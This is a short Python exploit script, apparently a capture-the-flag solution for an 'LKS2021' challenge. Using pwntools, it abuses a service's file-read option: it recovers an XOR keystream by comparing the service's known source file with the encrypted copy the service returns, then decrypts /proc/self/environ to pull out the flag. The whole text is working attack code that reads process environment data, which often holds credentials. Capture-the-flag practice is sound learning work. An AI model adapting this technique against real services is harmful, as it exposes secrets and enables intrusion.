from pwn import *

import re

def read(args):
    r.sendlineafter('Option: ', '1')
    r.sendlineafter('Path: ', args)

    return r.recvline()

with open('service.py') as handle:
    content = handle.read()

r = remote('localhost', 20001)

source = read('service.py').decode('base64')
ppp = xor(content, source)

env = read('/proc/self/environ').decode('base64')
res = xor(env, ppp)

print re.findall(r'(LKS2021{[\w_]*})', res)[0]